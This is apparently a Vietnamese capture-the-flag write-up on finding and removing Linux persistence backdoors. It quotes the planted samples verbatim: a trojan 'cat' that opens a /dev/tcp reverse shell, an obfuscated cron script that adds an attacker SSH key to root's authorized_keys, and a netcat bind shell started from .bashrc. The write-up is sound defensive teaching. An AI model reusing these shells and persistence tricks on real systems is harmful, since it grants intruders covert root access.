## 1. Phát hiện Backdoor qua .bashrc và /usr/local/sbin/

## a. Kiểm tra thư mục home

```bash
root@13e229253997:~# ls -la /home/bksec/
total 32
drwxr-x--- 1 bksec bksec 4096 Feb 28 07:22 .
drwxr-xr-x 1 root  root  4096 Feb 27 06:11 ..
-rw-r--r-- 1 bksec bksec  220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 bksec bksec 3771 Feb 28 07:22 .bashrc
-rw-r--r-- 1 bksec bksec 3807 Feb 27 06:11 .bashrc.bak
drwx------ 2 bksec bksec 4096 Feb 28 07:18 .cache
-rw-r--r-- 1 bksec bksec  807 Jan  6  2022 .profile
```
- .bashrc là file cấu hình mặc định trong Linux, nằm trong thư mục home của mỗi user (/home/username/.bashrc).
- .bashrc.bak KHÔNG phải file mặc định của Linux Đây là File backup được tạo ra bởi ai đó

**Phát hiện:** 
- File `.bashrc` có thời gian sửa đổi `07:22` ngày 28/02 (gần đây)
- File `.bashrc.bak` có thời gian `06:11` ngày 27/02 (cũ hơn)
- Điều này cho thấy `.bashrc` đã bị sửa đổi, khả năng cao là do em trai thêm backdoor

## b. Kiểm tra nội dung .bashrc

```bash
root@8a6e82de61ee:~# cat /home/bksec/.bashrc
[... nội dung bình thường ...]
export PATH="/usr/local/sbin:$PATH"
```

**Phát hiện:** 
- Dòng `export PATH="/usr/local/sbin:$PATH"` được thêm vào cuối file
- Đây không phải là cấu hình chuẩn của `.bashrc`
- Mục đích: thay đổi thứ tự tìm kiếm trong PATH, ưu tiên tìm lệnh cần thiết trong `/usr/local/sbin` trước

## c. Kiểm tra thư mục /usr/local/sbin

```bash
root@8a6e82de61ee:~# ls -la /usr/local/sbin/
total 16
drwxr-xr-x 1 root root 4096 Feb 27 06:11 .
drwxr-xr-x 1 root root 4096 Feb 10 14:05 ..
-rwxr-xr-x 1 root root  177 Feb 27 06:11 cat
-rwxr-xr-x 1 root root 3369 Feb 10 14:11 unminimize
```

**Phát hiện:** 
- File `cat` trong `/usr/local/sbin` có kích thước 177 bytes (rất nhỏ so với lệnh `cat` thật)
- Thời gian tạo `Feb 27 06:11` trùng với thời gian file `.bashrc.bak` - thời điểm em trai dùng máy

## d. Phân tích file cat giả mạo

```bash
root@8a6e82de61ee:~# cat /usr/local/sbin/cat
#!/bin/bash
# Silently open reverse shell in background
(bash -i >& /dev/tcp/172.17.0.1/9001 0>&1 2>/dev/null &) 2>/dev/null
# Execute real cat to avoid suspicion
/bin/cat "$@"
```

**Phát hiện quan trọng:** File này là một reverse shell backdoor:
- Kết nối đến IP `172.17.0.1` port `9001`
- Chạy ngầm trong background để không bị phát hiện
- Sau đó gọi lệnh `cat` thật (`/bin/cat`) để thực hiện chức năng bình thường, tránh gây nghi ngờ

**Cơ chế hoạt động:**
1. User đăng nhập, `.bashrc` chạy, thay đổi PATH
2. Khi user gõ `cat`, thay vì chạy `/bin/cat`, hệ thống tìm thấy `/usr/local/sbin/cat` đầu tiên
3. Script backdoor chạy, mở reverse shell kết nối ra ngoài
4. Sau đó chuyển tiếp tham số cho lệnh `cat` thật để user không thấy gì bất thường

### 🗑️ Cách xóa:
- xóa rm /usr/local/sbin/cat
- Xóa dòng trong /root/.bashrc: 
sed -i '\|export PATH="/usr/local/sbin:$PATH"|d' /root/.bashrc
- Xóa dòng trong /home/bksec/.bashrc:
sed -i '\|export PATH="/usr/local/sbin:$PATH"|d' /home/bksec/.bashrc

- Kiểm tra lại để chắc chắn đã xóa
grep "export PATH" /root/.bashrc /home/bksec/.bashrc

---

## **2. Systemd Service Backdoor (Issue 5 - đã xóa)**

### 🔍 Cách tìm:
- Kiểm tra các service tự động khởi động:
  ```bash
  ls -la /etc/systemd/system/multi-user.target.wants/
  ```
- Nhìn service có tên lạ, thời gian tạo trùng với lúc em bạn dùng máy.
- Xem nội dung service:
  ```bash
  cat /etc/systemd/system/system-healthcheck.service
  ```

### 📖 Giải thích:
- Systemd service là chương trình chạy ngầm, tự động khởi động lại nếu bị tắt.
- Service này mở port 8080, chờ kết nối từ bên ngoài và cho shell.

### 🗑️ Cách xóa:
```bash
# Xóa file service
rm /etc/systemd/system/system-healthcheck.service

```

---

## **3. SSH Authorized Keys Backdoor (ở đây có 2 Issue)**

### 🔍 Cách tìm:
- Kiểm tra crontab và các thư mục cron:
  ```bash
  ls -la /etc/cron.daily/
  total 28
  drwxr-xr-x 1 root root 4096 Feb 27 06:11 .
  drwxr-xr-x 1 root root 4096 Mar  1 06:18 ..
  rw-r--r-- 1 root root  102 Mar 23  2022 .placeholder
  rwxr-xr-x 1 root root 1478 Apr  8  2022 apt-compat
  rwxr-xr-x 1 root root  123 Dec  5  2021 dpkg
  rwxr-xr-x 1 root root  204 Feb 27 06:11 pyshell
  ```
- Nếu thấy file lạ (ví dụ `pyshell`), xem nội dung:
  ```bash
  cat /etc/cron.daily/pyshell
  #!/bin/sh

  VER=$(python3 -c 'import sys; print(".".join(map(str, sys.version_info[:2])))')
  MAJOR=$(echo $VER | cut -d'.' -f1)

  if [ $MAJOR -ge 3 ]; then
    /lib/python3/dist-packages/initiate-pyshell
  fi
  ```
- Theo dấu file được gọi trong script:
  ```bash
  cat /lib/python3/dist-packages/initiate-pyshell
  #!/bin/bash
  KEY=$(echo     "c3NoLWVkMjU1MTkgQUFBQUMzTnphQzFsWkRJMU5URTVBQUFBSUhSZHg1UnE1K09icTY2Y3l3ejVLVzlvZlZtME5DWjM5RVBEQTJDSkRxeDEgd3VhbkB3dWFuCg==" | base64 -d)
  PATH=$(echo "L3Jvb3QvLnNzaC9hdXRob3JpemVkX2tleXMK" | base64 -d)

  /bin/grep -q "$KEY" "$PATH" || echo "$KEY" >> "$PATH"
  ```
- Kiểm tra SSH authorized keys:
  ```bash
  cat /root/.ssh/authorized_keys
  ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHTdx5Rq5+Obq66cywz5KW9ofVm0NCZ39EPDA2CJDqx1 wuan@wuan
  ```

### 📖 Giải thích:
- Cron job chạy mỗi ngày, thêm SSH key của em bạn vào file `authorized_keys`.
- Nhờ đó, em bạn có thể SSH vào root mà không cần password.

### 🗑️ Cách xóa:
```bash
# Xóa cron job
rm /etc/cron.daily/pyshell

# xóa authorized_keys
rm /root/.ssh/authorized_keys (là một Issue)

# Xóa script Python backdoor
rm /lib/python3/dist-packages/initiate-pyshell
```
---

## Issue 1 (Bind shell 4444 + persistence qua /root/.bashrc + dropper /usr/bin/alertd)

### 1) Cách phát hiện (Detection)

### 1.1. Nghi vấn có cổng lạ đang mở (listen)

Trong container này thiếu `ss` nên không dùng được cách phổ biến:

```bash
ss -lntup
```

**Output:**

```text
-bash: ss: command not found
```

=> Dùng cách “low-level” đọc trực tiếp kernel procfs: **/proc/net/tcp** để tìm socket TCP đang **LISTEN** (`st = 0A`) rồi map ra **PID + command**.

### 1.2. Liệt kê TCP LISTEN + PID/command giữ cổng

Chạy (root):

```bash
for inode in $(awk 'NR>1 && $4=="0A"{print $10}' /proc/net/tcp | sort -u); do
  hexport=$(awk -v ino="$inode" 'NR>1 && $4=="0A" && $10==ino {split($2,a,":"); print a[2]; exit}' /proc/net/tcp)
  port=$((16#$hexport))
  pid=$(
    for p in /proc/[0-9]*; do
      ls -l "$p/fd" 2>/dev/null | grep -q "socket:\[$inode\]" && echo "${p#/proc/}" && break
    done
  )
  cmd=$(tr '\0' ' ' <"/proc/$pid/cmdline" 2>/dev/null)
  printf "port=%-5s inode=%s pid=%s cmd=%s\n" "$port" "$inode" "${pid:-?}" "${cmd:-?}"
done | sort -n -t= -k2
```

**Output (quan trọng):**

```text
port=22    inode=59202733 pid=15  cmd=sshd: /usr/sbin/sshd [listener] ...
port=4444  inode=59178818 pid=62  cmd=nc -e /bin/bash -lnp 4444
port=4444  inode=59196276 pid=108 cmd=nc -e /bin/bash -lnp 4444
port=4444  inode=59209755 pid=52  cmd=nc -e /bin/bash -lnp 4444
port=4444  inode=59233904 pid=194 cmd=nc -e /bin/bash -lnp 4444
```

✅ Kết luận phát hiện: có **nhiều tiến trình `nc -e /bin/bash` đang LISTEN port 4444** → cực kỳ bất thường.

---

### 2) Phân tích vì sao nguy hiểm (Impact / Risk)

### 2.1. `nc -e /bin/bash -lnp 4444` là gì?

* `-l` : listen (mở cổng chờ kết nối)
* `-n` : không resolve DNS
* `-p 4444` : cổng 4444
* `-e /bin/bash` : **khi có ai kết nối vào cổng này, netcat sẽ spawn /bin/bash và nối stdin/stdout qua socket**

=> Đây là **bind shell**. Ai kết nối tới `IP:4444` sẽ nhận được **shell**.

### 2.2. Nguy cơ

* Nếu process chạy với quyền **root** (thực tế là root) ⇒ attacker có **RCE root từ xa**.
* Có thể:

  * chạy lệnh tùy ý, cài malware/persistence khác,
  * đọc flag, lấy dữ liệu, pivot sang hệ thống khác trong mạng CTF,
  * phá máy hoặc che dấu dấu vết (log tampering).

---

### 3) Lần dấu xem ai spawn ra `nc` (Triage / Root cause)

### 3.1. Xem PPID của các tiến trình `nc`

Từ output ở bước 1.2, kiểm tra PPID:

```bash
ps -o pid,ppid,user,etime,cmd -p 52,62,108,194
```

**Output:**

```text
PID  PPID USER ELAPSED CMD
52   50   root   17:30 nc -e /bin/bash -lnp 4444
62   60   root   17:09 nc -e /bin/bash -lnp 4444
108  106  root   14:18 nc -e /bin/bash -lnp 4444
194  192  root   02:22 nc -e /bin/bash -lnp 4444
```

### 3.2. Xem “process cha” (PPID) là gì

```bash
ps -o pid,ppid,user,etime,cmd -p 50,60,106,192
```

**Output:**

```text
PID  PPID USER ELAPSED CMD
50   1    root  20:54 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
60   1    root  20:33 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
106  102  root  17:42 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
192  188  root  05:46 /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
```

✅ Kết luận: `nc` được spawn bởi `/usr/bin/alertd` (chạy qua `/bin/bash`).

---

### 4) Phân tích backdoor file `/usr/bin/alertd`

```bash
ls -la /usr/bin/alertd
/bin/sed -n '1,160p' /usr/bin/alertd
```

**Output:**

```text
-rwxr-xr-x 1 root root 38 Feb 27 06:11 /usr/bin/alertd
#!/bin/bash
nc -e /bin/bash -lnp 4444
```

✅ `alertd` là script siêu ngắn, chỉ có nhiệm vụ **mở bind shell 4444**.

---

### 5) Tìm persistence: cái gì auto-run `alertd`?

Quét các file chạy khi login/mở shell (profile/bashrc):

```bash
/bin/grep -RIn "alertd" \
  /etc/profile /etc/bash.bashrc /etc/profile.d \
  /root/.bashrc /root/.profile \
  /home/bksec/.bashrc /home/bksec/.profile \
  2>/dev/null
```

**Output:**

```text
/root/.bashrc:102:alertd -e /bin/bash -lnp 4444 &>/dev/null &
```

✅ Persistence nằm trong **/root/.bashrc**: mỗi lần root mở shell là backdoor lại chạy (vì chạy nền + redirect /dev/null nên khó thấy).

---

### 6) Cách giải quyết (Remediation) — chi tiết, dễ hiểu

### 6.1. Gỡ persistence trong `/root/.bashrc`

> Mục tiêu: “chặt nguồn”, để backdoor không tự mọc lại.

```bash
cp /root/.bashrc /root/.bashrc.bak_fix
sed -i '/alertd .*4444/d' /root/.bashrc
grep -n "alertd" /root/.bashrc || echo "OK: no alertd in /root/.bashrc"
```

**Output:**

```text
OK: no alertd in /root/.bashrc
```

### 6.2. Kill các tiến trình backdoor đang chạy + xóa dropper `/usr/bin/alertd`

> Mục tiêu: dọn sạch trạng thái đang listen 4444 + xóa file backdoor.

```bash
ps -eo pid,ppid,user,cmd | grep -E 'nc -e /bin/bash -lnp 4444|/usr/bin/alertd' | grep -v grep

pids=$(ps -eo pid,cmd | awk '/nc -e \/bin\/bash -lnp 4444|\/usr\/bin\/alertd/ {print $1}')
[ -n "$pids" ] && kill -9 $pids

/bin/rm -f /usr/bin/alertd
```

**Output tiêu biểu (trước khi kill):**

```text
50  1 root /bin/bash /usr/bin/alertd -e /bin/bash -lnp 4444
52 50 root nc -e /bin/bash -lnp 4444
...
```

### 6.3. Xác nhận Issue 1 đã được fix bằng checker

```bash
/root/solveme
```

**Output (đoạn liên quan):**

```text
Issue 1 is fully remediated
...
Keep looking! 5/7 issues fixed.
```

---


